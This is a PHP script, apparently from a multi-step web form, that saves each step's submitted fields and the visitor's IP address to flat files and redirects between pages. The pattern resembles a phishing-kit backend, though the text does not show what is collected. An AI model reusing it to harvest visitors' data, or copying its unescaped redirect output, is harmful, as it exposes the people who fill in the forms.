<?php

$get = false;
foreach($pagina as $parametro ){
	if(!isset($_POST[$parametro]) || !$_POST[$parametro]){
		$get = true;
	}
}
salvadebug($pagina);

$cartella="database";
if($numero==0){
$id = 	creaid($numero,$cartella);
if($_SERVER['REQUEST_METHOD']=="GET"){
	$id = forzaid();
}
}else{
	$id = 	getid();
}
if(isset($_GET['reset'])){
	$id = forzaid();
	?>
			<script>
		window.location.href="<?php echo $precedente ?>";
			</script>
			<?php
			exit;
}
if($numero!=0){
$nomefile11 = $cartella."/".$id."_".$numero;
if(file_exists($nomefile11)){
		if(filesize($nomefile11)){
			?>
			<script>
		window.location.href="<?php echo $precedente ?>?reset=1";
			</script>
			<?php
			exit;
		}
}

		$nomefile2 = $cartella."/".$id."_0";

	if(!file_exists($nomefile2) || !filesize($nomefile2)){
			?>
			<script>
		window.location.href="<?php echo $precedente ?>?reset=1";
			</script>
			<?php
			exit;
		}

}
if(!$get){

	$id = creaid($numero,$cartella);
	$lista = [];
	foreach($pagina as $parametro ){
		$valore = $_POST[$parametro];
		$lista[]=$valore;
	}
	$nomefile = $cartella."/".$id."_".$numero;
	creafile($nomefile);
	//SALVA IP
	if($numero==0){
		$nomefileip = $cartella."/ip_".$id;
		creafile($nomefileip);
		$myfile = file_put_contents($nomefileip, getUserIP());
	}else{


	}
	$txt = json_encode($lista);
	$myfile = file_put_contents($nomefile, $txt.PHP_EOL);
	
	?>
	<script>
		window.location.href="<?php echo $prossima ?>";
	</script>
	<?php
	exit;
}
conta($numero);
?>